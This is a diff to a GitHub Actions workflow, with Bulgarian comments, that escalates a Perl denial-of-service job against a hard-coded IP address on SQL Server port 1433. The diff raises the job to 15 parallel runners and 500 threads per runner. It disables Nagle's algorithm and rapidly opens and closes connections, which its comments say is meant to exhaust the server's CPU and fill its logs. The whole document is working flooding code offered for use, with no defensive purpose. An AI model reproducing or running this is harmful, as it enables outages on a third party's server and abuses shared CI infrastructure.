@@ -1,4 +1,4 @@
-name: SQL_L7_Stress
+name: SQL_Ultra_Stress
 on: workflow_dispatch
 
 jobs:
@@ -6,15 +6,15 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15] # Вдигаме на 15 машини
     steps:
-      - name: Run Perl L7 Attack
+      - name: Run Ultra Perl Attack
         run: |
-          # Създаваме Perl скрипта директно на GitHub машината
           cat << 'EOF' > attack.pl
           use strict;
           use IO::Socket::INET;
           use threads;
+          use Socket qw(IPPROTO_TCP TCP_NODELAY);
 
           my $target = "136.243.167.253";
           my $port = 1433;
@@ -22,20 +22,21 @@ jobs:
 
           sub stress {
               while (1) {
-                  my $socket = IO::Socket::INET->new(PeerAddr => $target, PeerPort => $port, Proto => 'tcp', Timeout => 1);
+                  my $socket = IO::Socket::INET->new(PeerAddr => $target, PeerPort => $port, Proto => 'tcp', Timeout => 0.5);
                   if ($socket) {
+                      # Забраняваме Nagle's algorithm за максимален PPS
+                      setsockopt($socket, IPPROTO_TCP, TCP_NODELAY, 1);
                       print $socket $payload;
-                      # Държим връзката отворена 2 секунди, за да заемем Worker Thread на сървъра
-                      select(undef, undef, undef, 2.0);
+                      # Затваряме веднага и отваряме нова, за да запълним лог-файловете и CPU-то
                       $socket->close();
                   }
               }
           }
 
-          for (1..100) { threads->create(\&stress); }
+          # Стартираме 500 паралелни нишки на всяка машина
+          for (1..500) { threads->create(\&stress); }
           while(1) { sleep 10; }
           EOF
 
-          echo "Starting Layer 7 Stress on node ${{ matrix.node }}..."
-          # Стартираме Perl скрипта за 10 минути
-          timeout 600s perl attack.pl
+          echo "Starting Ultra Stress on node ${{ matrix.node }}..."
+          timeout 900s perl attack.pl
